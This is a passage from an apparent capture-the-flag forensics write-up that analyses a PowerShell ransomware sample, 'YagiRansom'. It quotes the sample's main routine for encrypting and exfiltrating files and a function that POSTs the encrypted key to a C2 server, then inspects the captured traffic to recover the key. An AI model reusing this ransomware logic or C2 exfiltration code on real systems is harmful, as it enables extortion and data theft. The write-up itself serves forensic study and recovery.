style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { SendOK }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1000\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[i] Done!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Green ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"if ($Mode -eq &#x22;-d&#x22;) { \n   Write-Host ; Write-Host &#x22;[!] Shutdowning....&#x22; -ForegroundColor Red; sleep 1 }\nelse {\n   Write-Host ;\n   Write-Host &#x22;[+] Checking communication with C2 Server..&#x22; -ForegroundColor Blue\n   $DCe = GetStatus ; sleep 1\n   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})\n   Write-Host &#x22;[!] Encrypting ...&#x22; -ForegroundColor Red\n   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1\n   if ($ENyR -eq &#x22;-x&#x22;) { Write-Host &#x22;[i] Exfiltrating ...&#x22; -ForegroundColor Green\n      ExfiltrateFiles ; sleep 1 }}\n   if (!$DCe) { Write-Host &#x22;[+] Saving logs in yaginote.txt..&#x22; -ForegroundColor Blue }\n   else { Write-Host &#x22;[+] Sending logs to C2 Server..&#x22; -ForegroundColor Blue }}\n   if ($args -like &#x22;-demo&#x22;) { RemoveWallpaper ; PopUpRansom\n   if ($PayNow -eq &#x22;True&#x22;) { SendPay ; SendOK } else { SendClose ; SendOK }}\n   else { SendOK }\nsleep 1000 ; Write-Host &#x22;[i] Done!&#x22; -ForegroundColor Green ; Write-Host\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Create \u003Ccode>$WiETm\u003C/code> randomly.\u003C/li>\n\u003Cli>Encrypt files in \u003Ccode>EncrypFiles\u003C/code>.\u003C/li>\n\u003Cli>Use \u003Ccode>ExfiltrateFiles\u003C/code> to filter and send the data.\u003C/li>\n\u003C/ul>\n\u003C/section>\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"3\" aria-labelledby=\"reversing-the-encryption-process\">\u003Ch3 id=\"reversing-the-encryption-process\">Reversing the encryption process\u003C/h3>\n\u003Cp>We need to find the main key \u003Ccode>$WiETm\u003C/code>. You can use \u003Ccode>Ctrl\u003C/code> + \u003Ccode>F\u003C/code> to find where \u003Ccode>WiETm\u003C/code> is used in the functions.\u003C/p>\n\u003Cp>We can see in the function \u003Ccode>SendResults\u003C/code>:\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> SendResults\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $cvf \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Invoke-AESEncryption\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Key $Uz19o \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Text $WiETm ; $cVl \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $cvf\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $2YngY \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"> \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$cVl\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$zVSza\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Content\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!]\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"YagiRansom!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -NotMatch\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $XoX \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $2YngY ; $B64Logs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $RansomLogs\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/data\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method POST \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Body $XoX \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/logs\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method POST \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Body $B64Logs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"function SendResults {\n   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf\n   $2YngY = &#x22;> $cVl > $OgE > $zVSza > $7VEq&#x22;\n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;[!]&#x22; | Select-String &#x22;YagiRansom!&#x22; -NotMatch\n   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/data&#x22; -Method POST -Body $XoX 2>&#x26;1> $null\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/logs&#x22; -Method POST -Body $B64Logs 2>&#x26;1> $null }\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>\u003Ccode>$WiETm\u003C/code> is the plaintext that gets encrypted with AES using the key \u003Ccode>$Uz19o\u003C/code> and stored in \u003Ccode>$cvf\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>$cvf\u003C/code> is then encoded by \u003Ccode>R64Encoder\u003C/code> and stored in \u003Ccode>$cVl\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>$cVl\u003C/code> is stored in \u003Ccode>$2YngY\u003C/code> along with other variables\u003C/li>\n\u003Cli>\u003Ccode>$2YngY\u003C/code> is encoded with base64 and stored in \u003Ccode>$XoX\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>$XoX\u003C/code> is then sent to the server\u003C/li>\n\u003C/ul>\n\u003Cp>That was tiresome ~~. We got the \u003Ccode>.pcapng\u003C/code> file tho, this could help us to get the data we need.\u003C/p>\n\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"encrypeddatapackage-xox\">\u003Ch4 id=\"encrypeddatapackage-xox\">\u003Cspan class=\"katex\">\u003Cspan class=\"katex-mathml\">\u003Cmath xmlns=\"http://www.w3.org/1998/Math/MathML\">\u003Csemantics>\u003Cmrow>\u003Cmi>e\u003C/mi>\u003Cmi>n\u003C/mi>\u003Cmi>c\u003C/mi>\u003Cmi>r\u003C/mi>\u003Cmi>y\u003C/mi>\u003Cmi>p\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>d\u003C/mi>\u003Cmi>D\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>P\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>c\u003C/mi>\u003Cmi>k\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>g\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmo stretchy=\"false\">(\u003C/mo>\u003C/mrow>\u003Cannotation encoding=\"application/x-tex\">encrypedDataPackage (\u003C/annotation>\u003C/semantics>\u003C/math>\u003C/span>\u003Cspan class=\"katex-html\" aria-hidden=\"true\">\u003Cspan class=\"base\">\u003Cspan class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\">\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">n\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">cry\u003C/span>\u003Cspan class=\"mord mathnormal\">p\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mord mathnormal\">d\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mord mathnormal\">t\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P\u003C/span>\u003Cspan class=\"mord mathnormal\">a\u003C/span>\u003Cspan class=\"mord mathnormal\">c\u003C/span>\u003Cspan class=\"mord mathnormal\">ka\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g\u003C/span>\u003Cspan class=\"mord mathnormal\">e\u003C/span>\u003Cspan class=\"mopen\">(\u003C/span>\u003C/span>\u003C/span>\u003C/span>XoX)\u003C/h4>\n\u003Cp>Luckily the data was right at the beginning.\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-07_21-03.png)\r\n\u003Cem>HTTP Stream\u003C/em>\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"http\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"http\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">POST\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> /data \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">HTTP\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">/\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1.1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">User-Agent\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Content-Type\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> application/x-www-form-urlencoded\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Host\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 192.168.240.1:443\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Content-Length\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 188\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">HTTP/1.1 200 OK\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Content-Length\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 69\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Server\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> Microsoft-HTTPAPI/2.0\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Date\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> Wed, 18 Sep 2024 17:09:37 GMT\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">&#x3C;\u003C/span>\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">h1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">>It Works!&#x3C;/\u003C/span>\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">h1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">>&#x3C;\u003C/span>\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">p\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">>This is the default web page for this server&#x3C;/\u003C/span>\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">p\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">>\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"POST /data HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237\nContent-Type: application/x-www-form-urlencoded\nHost: 192.168.240.1:443\nContent-Length: 188\n\n0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\nHTTP/1.1 200 OK\nContent-Length: 69\nServer: Microsoft-HTTPAPI/2.0\nDate: Wed, 18 Sep 2024 17:09:37 GMT\n\n\u003Ch1>It Works!\u003C/h1>\u003Cp>This is the default web page for this server\u003C/p>\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>The endpoint was \u003Ccode>/data\u003C/code> and sent with \u003Ccode>HTTP POST\u003C/code>. Thus we could see our first clue.\u003C/p>\n\u003Cpre>\u003Ccode>$encrypedDataPackage = 